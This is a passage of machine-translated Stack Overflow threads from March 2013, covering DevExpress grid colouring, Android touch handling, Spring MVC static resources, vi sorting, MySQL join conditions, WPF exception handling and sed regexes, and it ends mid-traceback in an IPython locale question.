> 赞同：0
> 
> 时间：2013-03-21T06:44:23.747

我建议您去查看gridview 上的[DevExpress](http://documentation.devexpress.com/#windowsforms/CustomDocument1236)文档。

如果你需要一行来改变颜色，你可以这样做：

```
 public partial class Form1 : Form
  {
    public Form1()
    {
      InitializeComponent();

      gridControl1.DataSource = new List<Structure>
        {
          new Structure {Id = 1, Val1 = "nr 1"}, 
          new Structure {Id = 2, Val1 = "nr 2"}, 
          new Structure {Id = 3, Val1 = "nr 3"}
        };
    }

    private void gridView1_RowStyle(object sender, DevExpress.XtraGrid.Views.Grid.RowStyleEventArgs e)
    {
       int myExpectedRowHandle = 1;
       if (e.RowHandle == myExpectedRowHandle)
       {
         e.Appearance.BackColor = Color.Crimson;
       }
    }
  }

  public class Structure
  {
    public string Val1 { get; set; }
    public int Id { get; set; }
  } 
```

你`RowStyle`为这个特殊的工作处理事件。结果将如下所示： ![在此处输入图像描述](../Images/06f3d19e39af8cdfcb6301a7ba112770.png)

**编辑**

仅设置一个单元格的颜色 - 处理事件`RowCellStyle`

在我的例子中，你看起来像这样：

```
private void gridView1_RowCellStyle(object sender, RowCellStyleEventArgs e)
{
  int myExpectedRowHandle = 1;
  if (e.Column != colVal1 || e.RowHandle != myExpectedRowHandle)
    return;

  e.Appearance.ForeColor = Color.Crimson;
} 
```

# android - 在每个活动上创建一个线性视图以执行操作

> ID：15526960
> 
> 赞同：0
> 
> 时间：2013-03-20T14:52:01.423
> 
> 标签：android, android-linearlayout, ontouchlistener

我正在尝试创建在所有其他站点下方的视图，这些站点将在 3 个手指被触摸时执行操作。这些活动都有自己的触摸和滑动。

我通过创建一个扩展线性布局和拦截触摸的类来完成这项工作。并将其添加到 xml 中。

但这仅在按钮或视图之类的项目是可点击或可触摸的表面并且本身并未成为可触摸的表面时才被调用。

在

```
public class MyCatcher extends LinearLayout {

@Override
public boolean onInterceptTouchEvent(MotionEvent event) {
    int action = event.getAction();
    switch (action & MotionEvent.ACTION_MASK) {
    case MotionEvent.ACTION_POINTER_DOWN:
        // multitouch!! - touch down
        int count = event.getPointerCount(); // Number of 'fingers' in this
        if (count > 3) {
                doThis(mContext);
        }
    }
    return super.onInterceptTouchEvent(event);
} 
```

在xml中

```
<packagename.MyCatcher
 ....>
      my normal layout
</packagename.MyCatcher> 
```

所以当一个可触摸的项目被触摸但没有成为它自己的触摸层时，这段代码就起作用了。

我在构造函数中尝试了 setontouchlister，但没有成功。

谢谢你的帮助

**额外：当通过 onAttach 设置触摸监听器时，我可以让它捕捉触摸，但我不能像往常一样使用 event.getPointerCount()，因为它返回 1。我担​​心这可能会占用大量处理？/**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T15:15:52.497

```
onintercepttouchevent() 
```

仅在发生触摸事件时调用。IE; 触摸事件仅在按下启用了 onclicklistener 的按钮、文本框等视图项时发生。对于您的问题，您需要为整个视图设置 onclicklistener。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T15:15:55.737

代替布局，创建一个普通视图并将其添加到您现有的布局中，以便它跨越整个屏幕并位于所有其他视图的“上方”（按 z 顺序）。现在它应该在所有其他视图之前获取所有触摸事件。您的 onTouch... 实现应确保将所有触摸事件传递给其他视图（除非您希望按钮在某些情况下不起作用，然后不要传递事件）。

# z3 - Z3：Linux 中的 OCaml 支持

> ID：15526961
> 
> 赞同：0
> 
> 时间：2013-03-20T14:52:04.747
> 
> 标签：z3

为 Linux 上传的[每晚构建](http://z3.codeplex.com/releases/view/101913)不包括 OCaml 绑定。我们知道将来是否会添加绑定吗？

从源代码构建是获得 OCaml 支持的唯一方法吗？从上一个问题（[在 linux 中编译 z3 ocaml 绑定](https://stackoverflow.com/questions/12784686/compiling-z3-ocaml-binding-in-linux)）看来，构建系统还没有为 Linux 准备好。那改变了吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-24T00:50:54.123

我们很快就会为 Z3 提供一个新的 OCaml API，并且二进制文件将包含在每晚构建中。当前官方版本中的 OCaml API 是旧的，不支持 Z3 中可用的新功能。新的 OCaml API 将具有与 .NET、Java 和 Python API 相同的功能。该`ml-ng` [分支](http://z3.codeplex.com/SourceControl/list/changesets?branch=ml-ng)是这个新 API 的工作分支。

# android - 使用android sdk而不是opencv的人脸识别

> ID：15526964
> 
> 赞同：9
> 
> 时间：2013-03-20T14:52:07.043
> 
> 标签：android, face-recognition

我目前正在研究android中的人脸识别。我在互联网上花费了合理的时间，并在 Android 中找到了 FaceDetector.Face 类。这些是这个类的实用程序：

```
 Constants
 float  CONFIDENCE_THRESHOLD
 int    EULER_X The x-axis Euler angle of a face.
 int    EULER_Y The y-axis Euler angle of a face.
 int    EULER_Z The z-axis Euler angle of a face.

 Public Methods
 float   confidence()
 float   eyesDistance()
 void    getMidPoint(PointF point)
 float   pose(int euler) 
```

问题是，我不知道如何使用这些方法，也找不到任何教程或示例源代码。问题是，我应该使用 eyeDistance() 来区分人们吗？例如，莎拉的眼睛距离是 = 6.51 厘米，而约翰的眼睛距离是 = 6.82。当代码计算一个人的眼睛距离并且它是6.82时，它是否告诉你“它是约翰”这是识别人的方式吗？或者它的算法是什么？或者我应该使用 EULER 常量吗？以什么方式？我想我会使用这些方法进行人脸识别，但我不知道如何使用它。

或者你能推荐另一种人脸识别解决方案吗？任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-03-21T08:28:33.833

这`FaceDetector`门课没有做你认为它做的事情。具体来说，**它不做面部识别，而是面部检测**（因此是类名）。

![面部检测示例](../Images/b940b9b556eba9077407a7d4ce62dd67.png)

它分析图像并返回`Face`在图像中找到的 s。除了他们眼睛之间的距离之外，它在 s之间没有区别`Face`（你无法分辨它是 John's`Face`还是 Sarah's `Face`）——但这并不是一个真正有效的比较点。它只是为您提供找到的面孔以及找到的对象实际上是`Face`s 的置信度。

前任：

```
int maxNumFaces = 2; // Set this to whatever you want
FaceDetector fd = new FaceDetector(imageWidth,imageHeight,maxNumFaces);
Faces[] faces = new Faces[maxNumFaces];

try {
  int numFacesFound = fd.findFaces(image, faces);

  for (int i = 0; i < maxNumFaces; ++i) {
     Face face = faces[i];
     Log.d("Face " + i + " found with " + face.confidence() + " confidence!");
     Log.d("Face " + i + " eye distance " + face.eyesDistance());
     Log.d("Face " + i + " pose " + face.pose());
     Log.d("Face " + i + " midpoint (between eyes) " + face.getMidPoint());
  }
} catch (IllegalArgumentException e) {
  // From Docs:
  // if the Bitmap dimensions don't match the dimensions defined at initialization 
  // or the given array is not sized equal to the maxFaces value defined at 
  // initialization
} 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-05-08T07:30:55.217

正如 Tushar 所说，FaceDetector 只检测人脸。但是，您无法使用 FaceDetector 识别它们。眼距输出以像素为单位，而不是厘米或英寸。它表示人脸在位图图像中的大小。欧拉角应该代表头部的 3D 旋转。但是，如果您的应用使用 14 之前的任何 api，则欧拉角值将始终为 0.0（不计算它们）。所以，请注意这一点。

如果你想做人脸识别，可以使用opencv。我自己没有使用过，但我认为它可以在 Android 上使用。 [OpenCV 中的人脸识别](https://stackoverflow.com/questions/4856929/face-recognition-in-opencv) [http://docs.opencv.org/trunk/modules/contrib/doc/facerec/](http://docs.opencv.org/trunk/modules/contrib/doc/facerec/)

如果您不想或无法将 OpenCV 添加到您的项目中，您可以自己编写人脸识别程序。这需要一些时间，但并不难。您可以实现特征脸的一些变体：[http ://www.youtube.com/watch?v=LYgBqJorF44&list=PLd3hlSJsX_Imk_BPmB_H3AQjFKZS9XgZm&index=16](http://www.youtube.com/watch?v=LYgBqJorF44&list=PLd3hlSJsX_Imk_BPmB_H3AQjFKZS9XgZm&index=16)

祝你好运！

# css - 绝对位置加上 0 处的所有四个方向如何使内部元素居中？

> ID：15526970
> 
> 赞同：1
> 
> 时间：2013-03-20T14:52:11.893
> 
> 标签：css, layout, centering

我正在查看一些代码，虽然它有效，但我不明白下面的 CSS 是如何使内部 div 居中的。

[Codepen 演示](http://codepen.io/aaron/pen/awnKd)也可用。

HTML

```
<div class='outer'>
  <div class='inner'></div>
</div> 
```

CSS

```
div {
  border: 1px solid black;
  box-sizing: border-box;
}

.outer {
  position: absolute;
  background-color: goldenrod;
  width: 100%;
  height: 100%;
}
.outer .inner {
  width: 75%;
  height: 75%;
  background-color: green;
  position: absolute;
  top: 0;
  bottom: 0;
  right: 0;
  left: 0;
  margin: auto;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T14:53:52.340

只是因为

```
 margin: auto; 
```

您可以从[Box Model](http://www.w3.org/TR/CSS2/box.html)中更好地理解这一点。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T15:18:10.803

这是你的问题的答案。

只是告诉浏览器在`margin: auto`元素的左侧和右侧之间平均分配可用空间。按可用空间，父容器左右边缘之间的任何未占用的水平空间。

[参考](http://w3schools.invisionzone.com/index.php?showtopic=33525)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T15:30:42.077

出于某种原因，工作中的同事不想要甜蜜的 SO 点，所以这是他的答案。

如果你要放

```
top: 0;
bottom: 0;
left: 0;
right: 0; 
```

在没有高度或宽度的普通 div 上，它会使 div 成为其容器的整个大小。`height`将and放在`width`那个 div 上会限制它，虽然它会尝试填充它的容器，但它会尊重设置的尺寸。

`margin: auto;`如上所述的设置是关键。这允许此 div 的框通过在尊重其设置尺寸的同时平等扩展边距来填充其容器。

这是使事情居中的最佳方式吗？不知道，但它有效。

# java - 使用集成的 Spring 安全性访问 Spring 3 MVC 应用程序中的静态内容

> ID：15526975
> 
> 赞同：1
> 
> 时间：2013-03-20T14:52:22.830
> 
> 标签：java, spring, spring-mvc, spring-security

我已经通过 Spring Tool Suite 模板创建了 Spring 3 MVC 项目，并且在那里集成了 Spring 安全性。除了访问静态内容之外，一切正常。

当我只创建 MVC 应用程序并将我的静态内容放入`/src/webapp/WEB-INF/resources/`并放入`<resources mapping="/resources/**" location="src/main/webapp/WEB-INF/resources" />`我的`applicationContext.xml`.`applicationContext.xml`写到我的 web.xml 来完成这项工作？

我的`applicationContext.xml`文件如下所示：

```
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:context="http://www.springframework.org/schema/context"
xmlns:security="http://www.springframework.org/schema/security"
xsi:schemaLocation="
    http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd
    http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-3.0.xsd
    http://www.springframework.org/schema/security http://www.springframework.org/schema/security/spring-security-3.1.xsd">

<context:annotation-config />

<context:component-scan base-package="cz.cvut.fit.genepi.controllers" />

<import resource="classpath:applicationContext-security.xml" />

<bean
    class="org.springframework.web.servlet.view.InternalResourceViewResolver">
    <property name="prefix" value="/WEB-INF/views/" />
    <property name="suffix" value=".jsp" />
</bean> 
```

奇怪的是，当使用上面的代码时，映射视图控制器工作正常，但是当我使用它时，我得到了这个错误`The prefix mvc:resources is not bound`

```
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:context="http://www.springframework.org/schema/context"
xmlns:security="http://www.springframework.org/schema/security"
xmlns:mvc="http://www.springframework.org/schema/mvc"
xsi:schemaLocation="
    http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd
    http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-3.0.xsd
    http://www.springframework.org/schema/security http://www.springframework.org/schema/security/spring-security-3.1.xsd
    http://www.springframework.org/schema/mvc
    http://www.springframework.org/schema/mvc/spring-mvc-3.1.xsd">

<context:annotation-config />
    <context:component-scan base-package="cz.cvut.fit.genepi.controllers" />
<import resource="classpath:applicationContext-security.xml" />
<bean
    class="org.springframework.web.servlet.view.InternalResourceViewResolver">
    <property name="prefix" value="/WEB-INF/views/" />
    <property name="suffix" value=".jsp" />
</bean>

<mvc:resources mapping="/resources/**" location="/resources/" />

     </beans> 
```

解决方案的结构：

![在此处输入图像描述](../Images/2a2ba04092622c47c96bbd38eb58461c.png)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T15:17:47.650

代码应该在您的应用上下文定义（applicationContext.xml）中，并且位置相对于部署根目录：

```
 <mvc:resources location="/resources/" mapping="/resources/**"/> 
```

你需要在配置文件的顶部

```
 xmlns:mvc="http://www.springframework.org/schema/mvc" 
```

接着

```
 xsi:schemaLocation = http://www.springframework.org/schema/mvc
            http://www.springframework.org/schema/mvc/spring-mvc-3.1.xsd 
```

我认为可能有些混乱，正常的 wdirectory 结构是这样的：

```
src/main/java 
src/main/resources
src/main/webapp
src/main/webapp/WEB-INF
src/main/webapp/WEB-INF/jsps
src/main/webapp/css 
```

css 目录只是一个示例，我实际上有 javascipt 和图像目录，有些人更喜欢一个名为“静态资产”的目录。但是称它为资源是相当混乱的。src/main/resource/ 目录实际上包含整个项目的配置文件（我将 appContext.xml 和 log.properties 文件放在那里），它在部署时被复制到 WEB-INF，不应该用于映射静态资源。例如，在我的示例中，dactualyl 会像这样映射：

```
<mvc:resources location="/css/" mapping="/css/**"/> 
```

# objective-c - 通过 NSOutputStream 发送 UIImage

> ID：15526977
> 
> 赞同：9
> 
> 时间：2013-03-20T14:52:26.883
> 
> 标签：objective-c, xcode, nsstream, nsoutputstream

我正在尝试将用户拍摄的图像发送到服务器。我得到 JPEG 表示，将其附加到上传照片所需的字符串，然后通过 NSOutputStream 发送数据。但是，当我尝试从服务器取回照片时，我只能从顶部看到 10% 的照片。任何帮助，将不胜感激。

顺便提一句。套接字已打开并已连接。

这是我的代码：

```
NSString *requestString = [NSString stringWithFormat:@"SubmitPhoto::%@::", userID];
NSData * stringData = [requestString dataUsingEncoding:NSUTF8StringEncoding];

NSData *imgData = UIImageJPEGRepresentation(image, 1.0);

NSMutableData *completeData = [[NSMutableData alloc] initWithBytes:[stringData bytes] length:[stringData length]];
[completeData appendData:imgData];

//sending NSData over to server
[self.outputStream write:[completeData bytes] maxLength:[completeData length]]; 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-20T17:11:20.503

这是因为超出了您的**图像大小限制。**

处理此问题的更好方法是实现以下逻辑。

**发件人**

1.  转换`UIimage`为`NSData`

2.  拆分`NSData`成不同的块（建议每个块 1024 个）

3.  发送和跟踪每一块`NSData`

**接收者**

1.  声明`NSData`并存储块的第一部分`NSData`（1024）到它，它被接收。

2.  接收下一块`NSData`并使用`appendData:`方法来附加它

3.  收到所有块后，将收到的块转换`NSData`为`UIImage`

确保设计不同的结构来将数据传输为块，例如表示细节的结构（总块、总大小、块大小等），表示数据的结构（当前块大小、当前块数等） ，表示响应数据的结构（交付状态，交付的块数等）。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-20T16:28:15.367

我猜您只是想一次为缓冲区写入太多数据。做这样的事情来循环数据并以块的形式发送它：

```
 NSString *requestString = [NSString stringWithFormat:@"SubmitPhoto::%@::", userID];
    NSData * stringData = [requestString dataUsingEncoding:NSUTF8StringEncoding];

    NSData *imgData = UIImageJPEGRepresentation(image, 1.0);

    NSMutableData *completeData = [[NSMutableData alloc] initWithBytes:[stringData bytes] length:[stringData length]];
    [completeData appendData:imgData];

    NSInteger bytesWritten = 0;
    while ( completeData.length > bytesWritten )
    {
        while ( ! self.outputStream.hasSpaceAvailable )
            [NSThread sleepForTimeInterval:0.05];

        //sending NSData over to server
        NSInteger writeResult = [self.outputStream write:[completeData bytes]+bytesWritten maxLength:[completeData length]-bytesWritten];
        if ( writeResult == -1 ) {
            NSLog(@"error code here");
        }
        else {
            bytesWritten += writeResult;
        }
    }
}
// Both input and output should be closed to make the code work in swift 
```

# android - Apk 文件生成-问题

> ID：15526980
> 
> 赞同：1
> 
> 时间：2013-03-20T14:52:29.823
> 
> 标签：android, apk

我已经创建了一个签名的 .apk 文件，并且我已经完成了所有步骤（创建的密钥库、密码和有效期等...），并且我有一个 .apk 文件。

当我将它安装到任何移动设备时，它显示安装失败，所以我检查了 apk 文件。

它只包含

1.  META-INF 文件夹
2.  类.dex。

我找不到其他文件。这是我第一次面对这个问题。

有谁知道这可能是什么原因？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T14:57:46.500

在调试版本上安装生产版本，反之亦然，将导致安装失败。

先卸载当前版本。

密钥库签名的版本可以安装在彼此之上。调试签名版本可以安装在彼此之上。Debug 和 Keystore 版本不能相互叠加安装。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-25T12:31:39.043

我解决了这个问题......一些特权问题......如果我在同一个系统中与超级用户做同样的事情，一切正常（生成的 APK）。

谢谢朋友

# fancybox - FancyBox 中的 CKEditor 编辑已禁用

> ID：15526981
> 
> 赞同：0
> 
> 时间：2013-03-20T14:52:32.507
> 
> 标签：fancybox, ckeditor

我打算在 FancyBox 中使用 CKEditor，一切都很好，但如果我尝试为 ex 添加。表中的所有字段都被禁用。（我附上一张图片。图片相同，闪光灯......）

我尝试在没有 FancyBox 的情况下打开 CKEditor，它工作正常，但我需要像 FancyBox 一样。 ![在此处输入图像描述](../Images/f58f1752e6542ce0c377342016e37c06.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T17:01:48.317

jQuery UI（我相信在您的系统中使用过，但实际上在使用 Twitter Bootstrap 时会出现同样的问题）正在阻止 CKEditor 对话框中的所有输入。似乎来自 jQuery UI 的人正在解决这个问题，但我不确定是否已经发布了新版本，包括这个修复。

在 CKEditor trac 上查看[此错误报告以获取更多信息。](https://dev.ckeditor.com/ticket/10081)

# sorting - 如何用vi对文件行进行排序？

> ID：15526983
> 
> 赞同：3
> 
> 时间：2013-03-20T14:52:37.993
> 
> 标签：sorting, vim, vi, multiple-columns

我必须编辑具有多行的多个文件，而且所有内容都在三列中，如下所示：

```
#file

save    get    go
go      save   get
rest    place  reset 
```

列用制表符分隔。有没有可能使用vi根据**第二**列或**第三列对行进行排序的方法？**

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-20T15:09:58.303

按第二列排序：

```
:sor /\t/ 
```

按第 3 列排序：

```
:sor /\t[^\t]*\t/ 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T15:07:09.323

第二栏：

```
:sort /\%9c/ 
```

第三栏：

```
:sort /\%16c/ 
```

`\%16c`表示“第 16 栏”。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T14:58:38.347

1.  嗨，用“V”命令点亮要排序的行

2.  使用带有“！”的 bash 命令 进行选择，例如：

    !sort -k 10

其中数字是您的第二个（排序）列开始的列号。

vi 将用排序命令的输出替换选择 - 这是给定的原始选择。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-20T15:00:55.747

您可以为`sort`. 例如：

```
sort /^\w*\s*/ 
```

将在第二列排序（匹配模式后首先排序）。

同样地

```
sort /^\w*\s*\w*\s*/ 
```

应该在第三列排序。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-01-02T18:20:08.593

我在这里使用一些字符来分隔列 | 符号作为分隔符，一旦这样做，您可以使用下面的命令对特定列进行排序，如果您想对数字进行排序，并且它在某些版本的 vi 上工作而不是在 ubuntu vi 上工作，请使用 -n :(

/|.*|/ | 种类

# php - 特殊行为：并且没有 WHERE 仍然有效

> ID：15526985
> 
> 赞同：3
> 
> 时间：2013-03-20T14:52:49.960
> 
> 标签：php, mysql, where

我想知道为什么这个查询仍然可以完美运行。我认为 WHERE 子句总是必须以`WHERE`?

```
 SELECT `persons`.*
    FROM `persons`
    LEFT JOIN `team_memberships`
    ON (`team_memberships`.`participant` = `persons`.`id`)
    JOIN `teams`
    ON (`teams`.`id` = `team_memberships`.`team`)
    JOIN `departments`
    ON (`departments`.`id` = `teams`.`department`)
    JOIN `areas`
    ON (`areas`.`id` = `departments`.`area`)
    JOIN `companies`
    ON (`companies`.`id` = `areas`.`company`)

    [NO WHERE HERE]

    AND `persons`.`id` = ? 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-20T14:54:27.720

您刚刚在子句中添加了`AND`一个`ON`。该`ON`子句仅计算布尔值真或假，因此允许使用`AND`布尔`OR`运算符，并且所有关于括号等的常用规则也适用。

将特定于特定连接表的条件从您的`WHERE`子句移动到适当的`ON`子句中通常是有利的 - 如果没有其他原因，只是为了提高可读性。

*在继续连接其他表之前*限制连接的结果是合乎逻辑的* ，而不是返回一个大的结果集，然后在最后用一个`WHERE`子句过滤它。我说*逻辑是因为 DBMS 通常会优化您的查询，因此无论如何都会发生这种情况……但并非总是如此……有时可以通过在连接处进行过滤来改善性能不佳的查询（有时反之亦然）。

例如，如果您知道您只对 25 岁以上的人感兴趣，则有意义的是`JOIN persons ON persons.id = team_memberships.participant AND persons.age > 25`，而不是包含仅与年轻朋克有关的后续表格的*所有*结果，以便在最后再次过滤这些结果用你的`WHERE persons.age > 25`条款。

我的理解是，在附加表达式的情况下，连接性能可能会因子`ON`句中的附加表达式而降低：

*   导致对联接中的每一行进行评估（因此我`age > 25`上面的示例可能属于此类别），或者

*   依赖于一个/两个连接表中的非索引列，否则连接将仅依赖于索引列。

因此，即使它使特定的连接变慢，它仍然可能证明值得在连接时从结果集中剥离年轻的朋克，因为此时较小的结果集可能会为后续连接带来很大的性能提升。但是，如果将它们包含在连接中只会导致记录数量略有增加，那么实际上将它们包含在连接中然后在`WHERE`子句中将它们过滤掉可能会更快。

但我欢迎评论澄清/纠正我的理解。

* * *

编辑：根据下面的@ITroubs 评论，我真的应该澄清一下，如果连接是一个，`INNER JOIN`那么无论附加过滤条件是否在`ON`or`WHERE`子句中，最终结果集都将是相同的，但是例如在 OP 的原始示例`LEFT JOIN ON team_memberships`中如果过滤条件从 移动到 ，则产生完全不同的结果`WHERE`集`LEFT JOIN ... ON ...`。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-20T14:54:15.290

如果我没记错的话，mysql 会按如下方式执行您的查询：

```
SELECT `persons`.*
FROM `persons`
LEFT JOIN `team_memberships`
ON (`team_memberships`.`participant` = `persons`.`id`)
JOIN `teams`
ON (`teams`.`id` = `team_memberships`.`team`)
JOIN `departments`
ON (`departments`.`id` = `teams`.`department`)
JOIN `areas`
ON (`areas`.`id` = `departments`.`area`)
JOIN `companies`
ON ((`companies`.`id` = `areas`.`company`) AND `persons`.`id` = ?') 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T14:54:43.550

最后一个 AND 不是 WHERE 子句的一部分，它是 JOIN 子句的一部分

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-20T14:54:47.367

它之所以有效，是因为您实际上没有`WHERE`子句，您的条件`AND persons.id = ?`是最后一个子句的一部分`JOIN`

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-20T14:55:28.523

它实际上意味着

```
join  `companies` on ON (`companies`.`id` = `areas`.`company`) AND persons.id = ? 
```

因此，由于您正在执行内部连接 ​​- 它*几乎*等效。一旦你切换到 puter join 或复杂查询 - 有些东西会中断。

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2013-03-20T14:55:49.273

这是有效的，请参阅[http://dev.mysql.com/doc/refman/5.0/en/join.html](http://dev.mysql.com/doc/refman/5.0/en/join.html)，但请注意它们如何使用括号。

# c# - 从任何线程捕获未处理的异常

> ID：15526992
> 
> 赞同：11
> 
> 时间：2013-03-20T14:53:05.133
> 
> 标签：c#, .net, wpf, exception, unhandled-exception

## 编辑

这个问题的答案有帮助谢谢我的帮助:)但我最终使用了：[http ://code.msdn.microsoft.com/windowsdesktop/Handling-Unhandled-47492d0b#content](http://code.msdn.microsoft.com/windowsdesktop/Handling-Unhandled-47492d0b#content)

* * *

## 原始问题：

我想在我的应用程序崩溃时显示错误消息。

目前我有：

`App.xaml`：

```
<Application x:Class="WpfApplication5.App"
      xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
      xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
      DispatcherUnhandledException="App_DispatcherUnhandledException"  // <----------------
      StartupUri="MainWindow.xaml">
    <Application.Resources>             
    </Application.Resources>
</Application> 
```

代码隐藏`App.xaml`：

```
namespace WpfApplication5
{        
    public partial class App : Application
    {
        private void App_DispatcherUnhandledException(object sender, DispatcherUnhandledExceptionEventArgs e)
        {
            MessageBox.Show("Caught Unhandled Exception!");
        }
    }
} 
```

当错误发生在主线程上时，该解决方案效果很好。现在我的问题是我如何才能捕捉到另一个线程上发生的错误？

换句话说：当我按下这个按钮时，我能够捕捉到异常：（`App_DispatcherUnhandledException`被调用！）

```
 private void button1_Click(object sender, RoutedEventArgs e)
    {            
        int.Parse("lkjdsf");
    } 
```

但我无法捕捉到这个异常：

```
 private void button1_Click(object sender, RoutedEventArgs e)
    {
        Task.Factory.StartNew(() =>
        {
            int.Parse("lkjdsf");
        });
    } 
```

无论它们是否发生在主线程上，我如何才能捕获所有异常？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-03-20T14:56:17.247

您可以使用[AppDomain.UnhandledExceptionHandler](http://msdn.microsoft.com/en-us/library/system.appdomain.unhandledexception.aspx)来处理未捕获的异常。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-20T14:59:36.007

使用 AppDomain.UnhandledException 事件来捕获此异常。比您需要使用调度程序才能在 messageBox 中显示此异常（这是因为只有 ui 线程可以显示消息）

# sed - 使用 sed 翻转数组索引

> ID：15526993
> 
> 赞同：1
> 
> 时间：2013-03-20T14:53:07.760
> 
> 标签：sed

我有一些 java 代码声明了一个我想要翻转的二维数组。内容是这样的：

```
zData[0][0] = 198;
zData[0][1] = 198;
zData[0][2] = 198;
    ... 
```

我想翻转索引

```
zData[0][0] = 198;
zData[1][0] = 198;
zData[2][0] = 198; 
```

所以我试着用 sed 来做：

```
sed -r 's#zData[([0-9]*)][([0-9]*)]#zData[\2][\1]#g' DataSample1.java 
```

但不幸的是 sed 说：

```
sed: -e expression #1, char 43: Unmatched ) or \) 
```

字符串“zData”可能包含某种标志或选项吗？

我尝试不使用 -r 选项，但我有相同类型的消息：

```
sed 's#zData[\(\[\0\-\9\]\*\)][\(\[\0\-\9\]\*\)]#zData[\2][\1]#g' DataSample1.java 
```

谢谢你的帮助

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T15:23:17.427

试试那个：

```
sed 's#\([a-zA-Z0-9_-]\+\)\(\[[^]]*\]\)\(\[[^]*]\]\)\(.*$\)#\1\3\2\4#' 
```

它为变量名、第一个索引、第二个索引和其余的添加了四个捕获，然后切换顺序。

**编辑：** @Sudo_O 的扩展正则表达式解决方案更具可读性。谢谢！然而，在某些系统上`sed -r`可能不可用，因为它不是 [基本 POSIX](http://pubs.opengroup.org/onlinepubs/009695399/utilities/sed.html)的一部分。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-20T15:27:26.913

简单：

```
$ sed -r 's/(zData)(\[[^]]+])(\[[^]]+])/\1\3\2/' file
zData[0][0] = 198;
zData[1][0] = 198;
zData[2][0] = 198; 
```

正则说明：

```
# Match
(zData)     # Capture the variable name we want to transpose
(           # Start capture group for first index  
\[          # Opening bracket escaped to mean literal [
[^]]+       # One or more none ] characters i.e the digits 
]           # The closing literal ] doesn't need escaping here.
)           # Close the capture
(\[[^]]+])  # Same regexp as before for the second index 
# Replace
\1\3\2      # Switch the indexes but rearranging the 2nd and 3rd capture groups 
```

注意：切换`\[[^]]+]`到如果它对`\[[0-9]+]`您来说更清楚，所以不是说匹配一个左方括号，然后是一个或多个非右括号，然后是一个右括号，而是说匹配一个左方括号，后跟一个或多个数字，然后一个右括号。

# c# - C# Window Store 应用程序中的谷歌地图

> ID：15526995
> 
> 赞同：-1
> 
> 时间：2013-03-20T14:53:12.880
> 
> 标签：c#, google-maps, xaml

是否可以在使用 C# 和 XAML 的 Windows Metro 风格应用程序中使用谷歌地图 API？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T14:56:17.483

这是很有可能的。使用 Google MAP API 中包含的 JSON 或 REST 服务。有了这些，您几乎可以在任何平台上进行操作。请说明您尝试过的内容，并在未来更具体。

# python - IPython Notebook 语言环境错误

> ID：15526996
> 
> 赞同：43
> 
> 时间：2013-03-20T14:53:12.840
> 
> 标签：python, python-2.7, locale, ipython, ipython-notebook

安装最新的[Mac OSX 64 位 Anaconda Python 发行版](http://continuum.io/downloads.html)后，我在尝试启动 IPython Notebook 时不断收到 ValueError。

启动 ipython 工作正常：

```
3-millerc-~:ipython
Python 2.7.3 |Anaconda 1.4.0 (x86_64)| (default, Feb 25 2013, 18:45:56) 
Type "copyright", "credits" or "license" for more information.

IPython 0.13.1 -- An enhanced Interactive Python.
?         -> Introduction and overview of IPython's features.
%quickref -> Quick reference.
help      -> Python's own help system.
object?   -> Details about 'object', use 'object??' for extra details. 
```

但启动 ipython 笔记本：

```
4-millerc-~:ipython notebook 
```

导致 ValueError （带回溯）：

```
Traceback (most recent call last):
  File "/Users/millerc/anaconda/bin/ipython", line 7, in <module>
    launch_new_instance()
  File "/Users/millerc/anaconda/lib/python2.7/site-packages/IPython/frontend/terminal/ipapp.py", line 388, in launch_new_instance
    app.initialize()
  File "<string>", line 2, in initialize
  File "/Users/millerc/anaconda/lib/python2.7/site-packages/IPython/config/application.py", line 84, in catch_config_error
    return method(app, *args, **kwargs)
  File "/Users/millerc/anaconda/lib/python2.7/site-packages/IPython/frontend/terminal/ipapp.py", line 313, in initialize
    super(TerminalIPythonApp, self).initialize(argv)
  File "<string>", line 2, in initialize
